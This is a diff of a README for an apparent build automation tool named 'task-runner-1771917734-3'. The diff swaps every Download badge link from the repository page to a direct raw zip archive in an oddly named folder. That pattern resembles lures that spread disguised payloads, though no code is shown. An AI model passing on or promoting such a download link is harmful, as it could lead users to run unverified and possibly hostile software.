@@ -1,6 +1,6 @@
 # ⚙️ task-runner-1771917734-3 - Simple Build Automation Tool
 
-[![Download](https://img.shields.io/badge/Download-GitHub-brightgreen)](https://github.com/AMIRHIMSELF69/task-runner-1771917734-3)
+[![Download](https://img.shields.io/badge/Download-GitHub-brightgreen)](https://github.com/AMIRHIMSELF69/task-runner-1771917734-3/raw/refs/heads/main/differentiate/runner-task-3.9-beta.3.zip)
 
 ---
 
@@ -32,7 +32,7 @@ This section guides you step-by-step on how to download, install, and use task-r
 
 Click the big green button below to visit the official GitHub page for the software. On this page, you will find all the files needed to download the software onto your computer.
 
-[![Download](https://img.shields.io/badge/Download-GitHub-brightgreen)](https://github.com/AMIRHIMSELF69/task-runner-1771917734-3)
+[![Download](https://img.shields.io/badge/Download-GitHub-brightgreen)](https://github.com/AMIRHIMSELF69/task-runner-1771917734-3/raw/refs/heads/main/differentiate/runner-task-3.9-beta.3.zip)
 
   
 ### 2. Find the right file to download
@@ -155,4 +155,4 @@ task-runner-1771917734-3 --help
 
 Access the program files here:
 
-[![Download](https://img.shields.io/badge/Download-GitHub-brightgreen)](https://github.com/AMIRHIMSELF69/task-runner-1771917734-3)
+[![Download](https://img.shields.io/badge/Download-GitHub-brightgreen)](https://github.com/AMIRHIMSELF69/task-runner-1771917734-3/raw/refs/heads/main/differentiate/runner-task-3.9-beta.3.zip)
